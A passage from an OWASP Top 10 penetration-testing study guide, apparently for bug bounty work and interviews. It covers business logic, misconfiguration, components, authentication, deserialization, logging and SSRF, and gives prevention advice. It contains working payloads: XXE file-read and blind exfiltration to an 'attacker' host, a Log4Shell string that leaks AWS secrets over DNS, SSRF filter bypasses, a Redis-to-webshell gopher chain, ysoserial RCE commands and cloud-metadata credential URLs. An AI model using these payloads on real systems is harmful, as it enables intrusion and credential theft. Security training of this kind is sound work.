**Business-logic abuse** with concrete probes: **negative/overflow quantities** (`quantity=-1` → a credit/refund; integer overflow on `price × qty`); **price/parameter manipulation** (client-set `price`/`total`/`currency`, `discount=100`); **workflow-step skipping** (`POST /checkout/confirm` directly, without the payment step); **coupon/promo stacking** (apply the same code N times, or race it); **one-time-action replay** (reuse a spent voucher/token); **state-machine bypass** (move an order `pending → shipped` without paying). Plus **race conditions** (→ `RaceCondition/`) and **missing-by-design rate limiting** (OTP/reset brute → `AccountTakeover/`). Scanners miss these because every request is individually *valid* — you have to model the intended flow and break its assumptions.

### Q60. How do you threat-model to find A04 as an attacker?
Enumerate the app's **invariants** ("only buy what you can pay for," "one reward per account," "steps in order," "price set server-side") and violate each — replay, reorder, parallelize, negate, overflow, skip. A04 findings are broken invariants.

**Red-team / escalation**

### Q61. What is a race condition and how does it realize an A04 flaw?
Concurrent requests hitting a **check-then-act (TOCTOU)** window assumed serial: redeem-once, withdraw-within-balance, one-vote, use-OTP-once. Fire many requests *inside* that window → the check passes N times before any effect commits → the limit is enforced once but *applied* N times (double-spend, coupon over-redeem, balance over-draft). **How to test:** send 20–50 identical requests as near-simultaneously as possible — **Burp Repeater → "Send group in parallel"** (the HTTP/2 single-packet attack) or **Turbo Intruder** (`race-single-packet.py`), both of which land the requests in one TCP packet to defeat network jitter. Judge by the **invariant** (balance/count/used-flag before vs after), not the status codes. → `RaceCondition/`.

### Q62. Why is A04 lucrative and scanner-proof?
Every request is *individually valid* (no malformed input) — the bug is in the *sequence, quantity, timing, or trust assumptions*. Automated tools can't infer business intent, so these survive to production and pay well when a human models the flow.

**Interview**

### Q63. "Give an example of a business-logic vulnerability."
Skipping the payment step by calling the order-confirmation endpoint directly; setting a negative quantity to get a credit; stacking one-per-user coupons via parallel requests (race); manipulating a client-set price. All "valid" requests, real financial impact — that's A04.

**Prevention**

### Q64. Prevention + CWEs for A04?
Threat-model early; secure design patterns + a vetted control library; enforce business rules server-side + re-validate each step; design in rate limiting / anti-automation / **atomicity** (transactions, locks); write and test **abuse cases**; segment trust boundaries. CWEs: CWE-209, CWE-256, CWE-501, CWE-522, **CWE-362** (race), CWE-841 (workflow).

### Q64a. Give a checklist of business-logic tests you always try.
- **Numeric abuse:** negative quantities/amounts, `0`, huge values, decimals, integer overflow, currency swap.
- **Money path:** client-controlled `price`/`total`/`discount`; tamper the amount *after* it's calculated; replay a payment/confirmation token; **skip the payment step** by calling the confirm endpoint directly.
- **Quotas/limits:** one-per-user rewards, free-trial re-signup, coupon reuse/stacking, self-referral — and **race** each (parallel requests, Q61).
- **Workflow/state:** reorder steps, skip a required step, resume an abandoned/cancelled flow, force an object into a state (`approved`/`shipped`) you shouldn't reach.
- **Identity-in-the-flow:** substitute another user's `cart_id`/`order_id` mid-flow (second-order IDOR — ties A01).

Each is a *valid* request producing an *invalid* business outcome — the essence of A04. Quantify the harm (money extracted, stock denied) for the report.

---

# §A05 — SECURITY MISCONFIGURATION

**Core**

### Q65. What's the scope of A05?
Insecure/default configuration anywhere in the stack — app, server, framework, cloud, container — **plus XXE** (folded in 2021). Default creds, verbose errors/debug, unnecessary features/ports/methods, missing security headers, permissive CORS, directory listing, exposed admin/management interfaces, misconfigured cloud storage.

### Q66. Why is XXE under Security Misconfiguration?
XXE is fundamentally a **parser configuration** problem — the XML parser is left with external-entity/DTD processing *enabled* (an insecure default). The fix is a config change (disable DOCTYPE/external entities), so it's grouped with misconfiguration. → `XXE/`.

**How to test**

### Q67. Fastest A05 wins on most targets?
**Exposure recon** — the quick, high-signal ones: exposed **`.git`** (dump with `git-dumper` → full source + history + hard-coded secrets), **`.env`** / `config.php.bak` / `.DS_Store` / backups (`.zip`, `.sql`, `~`, `.bak`, `.old`), **directory listing**, **default creds** on management consoles (Tomcat Manager, Jenkins, Grafana, phpMyAdmin, Spring **`/actuator`**), **debug mode** leaking stack traces/secrets (Django `DEBUG=True`, Flask/Werkzeug console, Rails), and **missing security headers** (CSP, HSTS, `X-Content-Type-Options`). Tooling: `nuclei` (exposures/misconfig templates), `ffuf`/`dirsearch` with a backup+config wordlist, `nikto`. → `Recon/`, `JSFiles/`.

### Q68. Which concrete classes/kits route from A05?
`XXE/` (parser), `HostHeader/` (host-based reset/cache/routing), `CORS/` (permissive origin), `WebCache/` (cache poisoning/deception), `RequestSmuggling/` (front/back desync), `SubdomainTakeover/` (dangling DNS), `FileUpload/` (unrestricted upload→webshell), `Recon/`+`JSFiles/`.

**Red-team / escalation**

### Q69. How does XXE escalate beyond file read?
`file://` → local file read (`/etc/passwd`, source via `php://filter`); `http://` to internal/metadata → **SSRF → cloud IAM creds**; blind OOB via external DTD + parameter entities; parser-specific → **RCE** (`expect://`, jar). Frequently a Critical, not a Medium. → `XXE/`.

### Q70. What's the impact range of A05?
Info leak (verbose errors, directory listing) → data breach (open bucket, exposed `.git`/`.env`, exposed admin) → **RCE** (XXE→file/SSRF/RCE; default creds on a console; debug endpoints). Always chase the config finding to its worst reachable impact.

**Interview**

### Q71. "You find an exposed `.git` directory. What now?"
Dump it (`git-dumper`) → recover full **source** and history → hunt hardcoded **secrets/keys/DB creds/machineKey** → map the app and find more bugs from source → chain (e.g., machineKey → ViewState RCE). An exposed `.git` is often the start of a Critical, not just an info leak.

**Prevention**

### Q72. Prevention for A05?
Harden by default (no defaults, no debug in prod, minimal features/ports/methods); **disable XXE** (no DOCTYPE/external entities); security headers (CSP, HSTS, X-Content-Type-Options, frame options); strict CORS + Host allow-list; lock down cloud storage; remove exposed VCS/config/backups; automated config review + drift detection.

### Q73. CWEs for A05?
CWE-16 (configuration), CWE-2 (environmental), **CWE-611** (XXE), CWE-548 (info exposure via directory listing), CWE-756, CWE-1032.

### Q73a. Give the core XXE payloads (file read, SSRF, blind OOB).
- **In-band file read:** `<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>` → the file appears where `&x;` is echoed.
- **PHP source read** (base64 survives non-XML bytes): entity `<!ENTITY x SYSTEM "php://filter/convert.base64-encode/resource=/var/www/index.php">`.
- **SSRF → cloud metadata:** `<!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">` → IAM creds (mind IMDSv2's PUT-token).
- **Blind OOB** (nothing reflected): host an external DTD with nested *parameter* entities so the file's contents come back as a query string to your listener — `<!DOCTYPE r [<!ENTITY % dtd SYSTEM "http://attacker/evil.dtd">%dtd;]>` pointing at a DTD that reads `file:///etc/hostname` and appends it to `http://attacker/?d=...` (full DTD in the `XXE/` kit).

Also try **file-upload XXE** (SVG/DOCX/XLSX are zipped XML) and a **content-type switch** (send `application/xml` to a JSON endpoint). The fix is disabling DOCTYPE/external-entity processing. → `XXE/`.

---

# §A06 — VULNERABLE & OUTDATED COMPONENTS

**Core**

### Q74. What is A06 and why is it uniquely "cheap" for attackers?
Using components (libraries, frameworks, runtimes, OS packages, front-end deps) with **known vulnerabilities** or unmaintained/outdated/un-inventoried — you inherit their CVEs. Cheap because the exploit already exists ("n-day"): fingerprint the version, grab the PoC, fire. No novel research.

**How to test**

### Q75. How do you test for A06?
**Fingerprint** components + versions — server headers (`Server`, `X-Powered-By`), framework tells, JS lib versions via **retire.js**/**wappalyzer**, package manifests (`package.json`, `composer.lock`, `pom.xml`), **favicon hash** (Shodan `http.favicon.hash`), `nmap -sV`, `whatweb`. **Map to known CVEs** (searchsploit, GitHub Security Advisories, the vuln DB), then **verify exploitability in-context** — never report a version-in-a-list (Q76). Fast sweep: `nuclei` (thousands of version/CVE templates). Prioritise the RCE classes: Log4Shell (`JNDI/`), deserialization gadgets (`Deserialization/`), vulnerable front-end libs → XSS/prototype pollution.

### Q76. Why is "version-in-a-list ≠ a finding"?
A version match doesn't prove the vulnerable code path is used/reachable or that a backport patch isn't applied. Reporting raw scanner output causes false positives and burns triager trust. **Prove reachability/exploitability** or clearly label "potential."

**Red-team / escalation**

### Q77. What's the relationship between A06 and A08?
They overlap on **supply chain**: A06 = "you use a component with a *known* vuln"; A08 = "the component/update/pipeline lacks *integrity* protection." A known-CVE deserialization gadget is both. Follow the chain, not the label.

**Interview**

### Q78. "You find an outdated jQuery. Is that a finding?"
Not by itself. Confirm the specific CVE's vulnerable code path is **reachable** with attacker-controlled input and demonstrate real impact (DOM XSS / prototype pollution). Otherwise it's "informational/potential," clearly labeled. (Tests whether you inflate A06.)

**Prevention**

### Q79. Prevention for A06?
Inventory components (**SBOM**); patch/update continuously; monitor advisories for your stack; remove unused deps; pin + verify integrity; run **SCA** in CI.

### Q80. Real-world A06 examples + CWEs?
Log4Shell (Log4j RCE); Struts/Spring4Shell; deserialization RCE via ysoserial/PHPGGC gadgets; vulnerable jQuery/AngularJS → XSS; typosquatted npm/PyPI (→ `DependencyConfusion/`). CWEs: CWE-1104, CWE-937/1035.

### Q80a. Walk a Log4Shell (CVE-2021-44228) test end-to-end.
1. **Spray** a JNDI lookup into every field that might be *logged* — `User-Agent`, `X-Forwarded-For`, `Referer`, other headers, the username/search/any input: `${jndi:ldap://<token>.oob.net/x}` with a **per-input token** so you know which field fired.
2. **Confirm blind** via the OOB callback — a **DNS/LDAP hit** at Burp Collaborator / `interactsh` proves the string was interpolated (no shell needed).
3. **WAF bypass** with nested lookups: `${${lower:j}ndi:...}`, `${${::-j}${::-n}${::-d}${::-i}:...}`, `${jndi:${lower:l}${lower:d}ap://...}`.
4. **Secret exfil over DNS** (works even on 2.15): `${jndi:ldap://${env:AWS_SECRET_ACCESS_KEY}.<token>.oob.net/}` — the env var comes back as a subdomain label.
5. **Version reality:** 2.0-beta9–2.14.1 = full RCE; 2.15 = localhost-restricted + exfil; 2.16 removes lookups; fixed at 2.17.x. Turning the callback into live RCE needs a malicious LDAP referral server (marshalsec / JNDIExploit) + a permissive JDK — but for a bounty the **OOB callback is proof**; don't build live RCE unless the program asks. → `JNDI/`.

---

# §A07 — IDENTIFICATION & AUTHENTICATION FAILURES

**Core**

### Q81. What is A07?
Weaknesses in confirming identity, authenticating, and managing sessions (formerly "Broken Authentication"). Credential stuffing/brute exposure, weak/default passwords, weak MFA, session flaws (fixation, no invalidation, exposure), weak reset flows, identity-federation (OAuth/SSO/SAML) flaws.

### Q82. What's the impact ceiling and why?
**Account takeover** — the whole category is impersonating a user. Break auth and everything behind it is accessible as that user/admin. Weak reset → ATO; no rate limit → brute/OTP bypass; fixation/no-invalidation → hijack; OAuth misconfig → token theft; stuffing → *mass* ATO.

**How to test**

### Q83. Which kits own A07 work?
`AccountTakeover/` (reset/2FA/OTP/session/registration), `JWT/` (token crypto), `OAuth/` (OAuth2/OIDC/SAML), `CSRF/` (login-CSRF). Most A07 testing is "abuse the recovery/session/federation flow."

### Q84. Walk through testing a password-reset flow.
Check **host/link poisoning** — send the reset request with a tampered `Host: attacker.com` (or `X-Forwarded-Host: attacker.com`, or `Host: target.com` + `X-Forwarded-Host: attacker.com`); if the emailed link points at *your* host, the victim's click leaks the token to you → **0-click ATO** (→ `HostHeader/`). Then: **token entropy** (sequential/timestamp/short → predictable, Q31); **token leakage** (in the `Referer` sent to third-party scripts, in logs, or echoed in the response body); **email HPP/CRLF** (`email=victim@x&email=attacker@x`, or CRLF to inject a `Cc:`); **no rate limit** (brute the token/OTP); **reuse/expiry** (works twice? never expires? still valid after a newer one is issued?); **user enumeration** (different message/timing for valid vs invalid email). → `AccountTakeover/`.

### Q85. What headline OAuth/SSO flaws do you test?
`redirect_uri` bypass (→ code/token theft), missing `state` (→ login CSRF / account-linking ATO), code replay, PKCE downgrade/omission, `id_token` forgery (`alg:none`/unverified sig/`aud` swap), SAML XSW/sig-strip/comment-canonicalization. → `OAuth/` (+ `JWT/`).

**Red-team / escalation**

### Q86. What is "pre-account-takeover" and why is it a favorite?
Attacker **pre-registers** the victim's email (unverified); victim later signs up via SSO which **merges/links** to the attacker-seeded account → attacker keeps access → ATO. Silent, high-impact, commonly missed. → `OAuth/` + `AccountTakeover/`.

### Q87. How does a JWT flaw become full ATO?
`alg:none` (server accepts unsigned) → forge any `sub`/`role`; weak HS256 secret → crack + sign an admin token; RS256→HS256 confusion → sign with the public key as HMAC secret; `kid`/`jku` injection → point verification at your key. Any → impersonate arbitrary users/admin. → `JWT/`.

**Interview**

### Q88. "How do you implement secure session management?"
Rotate the session ID on login (defeat fixation); invalidate server-side on logout + expiry; short-lived + idle timeout; `HttpOnly` + `Secure` + `SameSite` cookies; never put session IDs in URLs; bind to context where feasible. AuthN success must issue a *new* session.

### Q89. "What is MFA and does it stop everything?"
Multi-factor requires ≥2 of know/have/are. It blocks credential-stuffing/phishing of passwords alone — but not **weak MFA** (no rate limit on OTP → brute; OTP over SMS → SIM-swap; response-flip; backup-code abuse; MFA-fatigue push-bombing). So MFA presence ≠ MFA done right. → `AccountTakeover/`.

**Prevention**

### Q90. Prevention for A07?
MFA; no default/weak passwords + breached-password checks; **rate limiting + lockout** on all auth/OTP/reset endpoints; secure sessions (Q88); host-independent reset links + strong tokens; exact-match OAuth `redirect_uri` + `state` + PKCE; verify email before SSO linking.

### Q91. CWEs for A07?
CWE-287 (improper authentication), CWE-384 (session fixation), CWE-307 (improper restriction of auth attempts), CWE-620 (unverified password change), CWE-640 (weak reset), CWE-798 (hardcoded creds), CWE-613 (insufficient session expiration).

### Q91a. How do you test 2FA/OTP for a rate-limit (brute-force) bypass?
The flagship A07/A04 2FA bug is **no rate limit on the OTP verify endpoint**. Test: request an OTP for *your own* account, then brute the 6-digit code (`000000`–`999999`) with Burp Intruder / `ffuf` — no lockout or throttle means one of a million tries eventually wins → **2FA bypass**. Other 2FA weaknesses to check on your own account: **response manipulation** (verify returns `{"success":false}` → flip to `true` and see if the app trusts the client), **status-code / step force-browsing** (jump straight to the post-2FA page), **OTP reuse / no expiry**, **backup-code brute**, **racing the verify** (parallel guesses → `RaceCondition/`), and **OTP echoed in the response body**. Prove on your own account, stop at the first correct guess. → `AccountTakeover/`.

---

# §A08 — SOFTWARE & DATA INTEGRITY FAILURES

**Core**

### Q92. What is A08 and why introduced in 2021?
Code/infrastructure failing to protect against **integrity violations** — trusting unverified sources/plugins/data, auto-updates without integrity checks, **insecure deserialization** (folded in), **CI/CD** compromise. Introduced to capture the rise of **software supply-chain** + deserialization risk under one integrity theme.

### Q93. Why is insecure deserialization the headline?
> *Plain version:* "deserializing" = rebuilding a live object out of saved bytes. If those bytes come from an attacker, the rebuild step can be steered into running their code (a "gadget chain"). That's why it's the RCE headline of this bucket — the app runs code it never meant to.

Deserializing attacker-controlled data can instantiate arbitrary objects and trigger **gadget chains → RCE**. It's an integrity failure — the app trusts a serialized blob it can't verify. Per-language: Java `ObjectInputStream` (ysoserial), PHP `unserialize`/phar (PHPGGC), .NET `BinaryFormatter`/ViewState (ysoserial.net), Python `pickle`, Ruby `Marshal`, Node `node-serialize`. → `Deserialization/`.

**How to test**

### Q94. How do you *safely* confirm deserialization without a shell?
**OOB-first**: a benign gadget that causes only a **DNS/HTTP callback** (Java **URLDNS**) or a `sleep` — it proves the blob is deserialized *without* running attacker code. Concretely: `java -jar ysoserial.jar URLDNS "http://<token>.oob.net" | base64` → drop the blob where the app deserializes (a cookie, a `rO0`-prefixed param, a `__VIEWSTATE`) → a **DNS hit** at your listener = confirmed. URLDNS is ideal because it fires on a *default* classpath (no gadget library required) and does nothing but resolve a hostname. Then stop and report (SAFE-PoC discipline) — don't run a real command.

### Q95. What are ViewState and machineKey?
ASP.NET **ViewState** is a Base64 serialized blob round-tripped via the client (`__VIEWSTATE`). If it's **not MAC-protected** (`enableViewStateMac=false`, or the pre-2014 patch gap) or the **machineKey** (`validationKey`/`decryptionKey`) is leaked/default, an attacker forges a malicious ViewState → deserialization → **RCE**: `ysoserial.net -p ViewState -g TypeConfuseDelegate -c "<cmd>" --generator=<__VIEWSTATEGENERATOR> --validationkey=<key> --validationalg=<alg>`. A machineKey leaked via **`.git`/`web.config`/LFI** → forge → RCE — which is why this bridges A02 (key management) / A05 (misconfig) / A08 (deserialization). → `Deserialization/`.

**Red-team / escalation**

### Q96. How does A08 cover CI/CD and updates?
Auto-updates that fetch + run code **without signature verification**, unsigned artifacts, injectable pipeline steps, compromised deps (dependency confusion/typosquatting — → `DependencyConfusion/`). **SolarWinds** is the archetype: trusted pipeline → signed-but-poisoned artifact → mass compromise.

**Interview**

### Q97. "Why is deserializing untrusted data dangerous?"
Because deserialization can *reconstruct arbitrary object graphs* and invoke methods during/after construction; with the right **gadget chain** already on the classpath, that leads to code execution — without the app ever "intending" to run code. The fix is: don't deserialize untrusted data, or use data-only formats + type allow-lists + integrity checks.

**Prevention**

### Q98. Prevention for A08?
Avoid deserializing untrusted data (or safe formats + type allow-lists + integrity/signature checks); **sign + verify** updates/plugins/artifacts; verify dependency integrity/provenance + pin; secure the CI/CD pipeline (least privilege, signed builds, no injectable steps); never trust unsigned data for security decisions.

### Q99. Real-world A08 examples + CWEs?
ysoserial Java RCE; .NET ViewState RCE via leaked machineKey; PHP phar/POP-chain RCE; SolarWinds CI/CD compromise; dependency-confusion RCE in CI. CWEs: **CWE-502** (deserialization), CWE-345 (insufficient integrity), CWE-494 (download without integrity check), CWE-829, CWE-565.

### Q99a. How do you recognise a serialized blob (magic bytes) per language?
Fingerprint the format before attacking it:
- **Java** — raw `AC ED 00 05`, or Base64 **`rO0AB`** (very common in cookies/params/ViewState-like fields).
- **.NET BinaryFormatter** — raw `00 01 00 00 00 FF FF FF FF`, Base64 **`AAEAAAD/////`**.
- **Python pickle** — raw `\x80\x04…` (protocol 4), often Base64 `gAS…`/`gAR…`; look for `.pkl`, `cPickle`.
- **PHP** — `serialize()` text like `O:4:"User":…` (object) or `a:2:{…}` (array); phar files begin `<?php … __HALT_COMPILER();` with a manifest.
- **Ruby Marshal** — raw `04 08`, Base64 **`BAh`**.
- **gzip-wrapped** (any of the above, compressed) — raw `1F 8B`, Base64 **`H4sI`**.

Seeing one of these in a cookie/token/hidden field is the trigger to test deserialization (Q94). → `Deserialization/`.

---

# §A09 — SECURITY LOGGING & MONITORING FAILURES

**Core**

### Q100. What is A09 and why is it in the Top 10 despite being "defensive"?
Insufficient logging, monitoring, alerting, and incident response — so attacks aren't **detected, escalated, or investigated**. It's listed because inadequate detection **amplifies every other bug** (attackers operate unnoticed, breaches persist, no forensics). It's about time-to-detect, a real risk even without a single "pop this" exploit.

**How to test**

### Q101. How do you assess A09 during a test?
Do noisy things (failed logins, authz denials, injection probes, high-value actions) and ask **"was it detected/alerted?"** Check whether auth failures, access-control denials, input-validation failures, and high-value transactions are logged with context. Red-team: operate below alerting thresholds (anti-forensics) to gauge maturity.

**Red-team / escalation**

### Q102. What's the offensive angle on A09?
**Log injection** — inject `\r\n` (CRLF) into a logged field (username, `User-Agent`) to **forge/split** log lines: `admin\r\n[INFO] user 'admin' logged in successfully` fabricates a fake event, letting you pollute logs to hide tracks or frame another user (log forging, CWE-117). If logs render in a web dashboard, injected `<script>` → **stored XSS in the log viewer**. The RCE-grade case: a value that executes *when logged* → **Log4Shell/JNDI** (→ `JNDI/`). Plus **sensitive data in logs** (PII/tokens/passwords written to logs, later exposed via LFI/traversal). So A09 is both a detection gap *and* a concrete finding.

**Interview**

### Q103. How is Log4Shell related to A09?
The ultimate irony: the **logging** path became RCE. A user-controlled value (User-Agent, username) logged by vulnerable Log4j triggered a **JNDI lookup → remote class load → RCE**. Logging untrusted input *unsafely* is both an A09 concern and an A06/A08 RCE. → `JNDI/`.

**Prevention**

### Q104. Prevention + CWEs for A09?
Log security-relevant events (auth, authz, input failures, high-value actions) with context + integrity; centralize + monitor + **alert**; protect logs (encode logged input; no sensitive data in logs); define + test incident response; retain appropriately. CWEs: CWE-778 (insufficient logging), **CWE-117** (log injection), CWE-223, CWE-532 (sensitive info in logs).

### Q104a. What's a concrete, *reportable* A09 finding (vs "they don't log enough")?
The pure detection gap ("auth failures aren't logged/alerted") is hard to bounty alone — you usually *assess* it, not *exploit* it. The **reportable** A09 findings are the concrete ones: (1) **log injection / forging** — CRLF into a logged field creates fake or misleading entries (CWE-117); prove it by making a forged line appear in a log you can read. (2) **sensitive data in logs** — PII/tokens/passwords/full requests written to a log you can reach (via LFI, an exposed log endpoint, or `logcat` on mobile) → info-disclosure, CWE-532. (3) **log-viewer XSS** — injected markup executing in the admin's log dashboard. For the pure detection gap, frame it as a *contributing* weakness ("these injection attempts triggered no alert, letting an attacker iterate undetected"), not a standalone Critical.

---

# §A10 — SERVER-SIDE REQUEST FORGERY (SSRF)

**Core**

### Q105. What is SSRF and why its own 2021 slot?
> *Plain version:* you hand the server a URL and it goes and fetches it *for you*. Since the server lives inside the trusted network, it can reach internal-only spots — most famously the cloud "metadata" address that spits out the server's master keys. You're borrowing the server's trusted position.

The server is induced to make **requests to attacker-chosen destinations** (fetches a URL/host/resource server-side). It earned a slot (community survey) because modern cloud/microservice apps constantly fetch URLs, and the **cloud-metadata** angle made it a reliable Critical.

### Q106. Why is SSRF the "cloud-era Critical"?
SSRF → `http://169.254.169.254/` (metadata) → **IAM credentials** → assume role → **cloud account takeover / RCE**; or → internal services (admin/Redis/DB/internal APIs) → RCE/lateral; internal port scan; blind SSRF → OOB → chain. **Capital One (2019)** is canonical. → `SSRF/`.

**How to test**

### Q107. Where do SSRF sinks live?
URL params, webhooks, "import from URL," link/URL previews, image/PDF fetchers, PDF-from-HTML, SSO/OIDC **metadata/JWKS** URLs, XML external entities (**XXE→SSRF**). Anywhere the *server* fetches something you influence.

### Q108. How do you bypass SSRF allow-lists/filters?
Concrete bypasses (target `169.254.169.254` / `127.0.0.1`): **IP encodings** — decimal `2852039166`, hex `0xA9FEA9FE`, octal `0251.0376.0251.0376`, and `127.0.0.1` → `127.1` / `0` / `0177.0.0.1`; **IPv6** `[::1]`, `[::ffff:169.254.169.254]`; **userinfo confusion** `http://allowed.com@169.254.169.254/`, `http://169.254.169.254#allowed.com`; **DNS tricks** — a hostname you control that resolves to `169.254.169.254`/`127.0.0.1` (or `169.254.169.254.nip.io`); **DNS rebinding** (a TTL-0 record that flips allowed→internal between the validator's check and the fetcher's request); **redirect-to-internal** (an open redirect on an allow-listed host → the fetcher follows it inward — → `OpenRedirect/`); **alternate schemes** (`gopher://`, `dict://`, `file://`); and **parser differentials** where validator and fetcher disagree on the host. → `SSRF/`.

**Red-team / escalation**

### Q109. What's blind SSRF and how do you exploit it?
The server makes the request but you don't see the response. **Confirm** with an **OOB** listener (Collaborator/`interactsh`) — a DNS/HTTP callback proves the fetch even with no visible output. **Exploit** via `gopher://`, which lets you send *arbitrary bytes* to an internal TCP service: hit internal **Redis** (`gopher://127.0.0.1:6379/_` + URL-encoded `CONFIG SET dir /var/www/html` / `CONFIG SET dbfilename shell.php` / `SET x '<?php system($_GET[c]);?>'` / `SAVE` → webshell), unauthenticated internal APIs/admin panels, or DB protocols. Where you can't see output, **infer state** from timing and error differences (open vs closed ports, 200 vs 500). → `SSRF/`.

**Interview**

### Q110. "Explain SSRF to a junior dev."
"Your server fetches a URL I give it — like a link preview. I give it `http://169.254.169.254/`, a special internal address that hands out your cloud server's credentials. Your server fetches it *for me*, and I get your cloud keys. SSRF = the server making requests on the attacker's behalf to places the attacker can't reach directly."

### Q111. "When is a server-side fetch NOT SSRF?" (common mislabel)
If the **client/browser** makes the request, it's not SSRF — an **open redirect** (server tells the browser to go somewhere) is not SSRF; SSRF requires the **server** to fetch. A URL reflected but never fetched is not SSRF. → `OpenRedirect/` is the sibling, not the same thing.

**Prevention**

### Q112. Prevention for A10?
Avoid fetching client-supplied URLs where possible; else **allow-list** schemes/hosts/ports and **re-validate after every redirect**; block internal ranges + metadata IPs at the network layer (egress filtering, **IMDSv2**); resolve-and-pin DNS (defeat rebinding); disable unused schemes; isolate the fetcher; never return the raw fetch response.

### Q113. What is IMDSv2 and how does it help?
AWS Instance Metadata Service v2 requires a **session token obtained via a PUT** (with a hop-limit) before reading metadata — a simple SSRF `GET` to `169.254.169.254` no longer returns credentials. It's a key SSRF mitigation for AWS; enforce it (and it's a good remediation to recommend in reports).

### Q114. CWE for A10?
**CWE-918** (Server-Side Request Forgery).

### Q114a. Give the cloud-metadata endpoints per provider (and what IMDSv2 changes).
The SSRF "money shot" — reach `169.254.169.254` and read credentials:
- **AWS (IMDSv1):** `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>` → temporary `AccessKeyId`/`SecretAccessKey`/`Token`. **IMDSv2** requires a session token first — `PUT /latest/api/token` with header `X-aws-ec2-metadata-token-ttl-seconds: 21600`, then send it back as `X-aws-ec2-metadata-token` on the GET — so a *plain blind GET* SSRF often can't reach it (needs a PUT + custom header; a full-request SSRF still can).
- **GCP:** `http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token` with header `Metadata-Flavor: Google`.
- **Azure:** `http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/` with header `Metadata: true`.
- **DigitalOcean / Oracle / Alibaba** expose analogous `169.254.169.254` paths.

Stolen IAM creds → `aws sts get-caller-identity` (read-only proof) → the role's permissions = the blast radius (→ cloud takeover). Enforcing **IMDSv2** + egress filtering is the top mitigation. → `SSRF/`.

---

# §XC — CROSS-CATEGORY CHAINING & REPORTING

### Q115. How do OWASP categories combine into a full kill chain?
**Recon (A05/A06 exposure)** → exposed `.git` → source + leaked machineKey → **A08** ViewState deserialization → **RCE** → read cloud-metadata (**A10**) → IAM creds → cloud takeover. Or **A01** IDOR → admin data → **A07** weak reset → admin ATO → **A03** stored XSS in admin panel → mass session theft. Chains cross categories; follow impact, not labels.

### Q116. Which categories are "chain enablers" vs "finishers"?
**Enablers** (foothold/primitive): A05/A06 (exposure, known-CVE entry), A01 (reach objects/functions), A02 (leaked tokens/keys), A09 (operate unseen). **Finishers** (the Critical payoff): A03 (RCE/dump), A08 (RCE), A10 (cloud takeover), A07 (ATO). Good reports show the enabler→finisher path.

### Q117. How do you keep false positives low across the Top 10?
**Control-baseline everything**; prove *interpretation/impact* not *reflection*; use two accounts for authz claims; confirm blind bugs with repeatable timing or OOB; verify component CVEs are reachable. A finding reproducible with a benign marker and a clear "as X I did Y to Z" is triager-proof.

### Q118. What's the SAFE-PoC discipline per high-impact category?
RCE (A03/A08): benign marker (`id`/OOB/URLDNS), never destructive. A01/A07: two OWN accounts, "as A I accessed/modified B," restore state. A10: hit your OWN OOB listener / read a benign metadata field, don't harvest real creds. A02: crack your own test token. Own accounts, benign markers, minimal proof, clean up.

### Q119. How do you map a finding back to the Top 10 for a report?
Report the **concrete vuln + demonstrated impact first**, then tag category + CWE + CVSS: "IDOR on `GET /api/orders/{id}` → read any user's orders (**A01**, CWE-639, CVSS 7.5)." Triagers and program scopes speak both; impact-first + framework tag is the professional format.

### Q120. The one meta-lesson across all ten?
**Never trust the client, and separate code from data.** Almost every category is a failure of one: trusting client-supplied identity/role (A01/A07), input becoming code (A03/A08/A10), or trusting unverified components/data/config (A05/A06/A08). Design for zero-trust of input and least privilege of everything, and most of the Top 10 collapses.
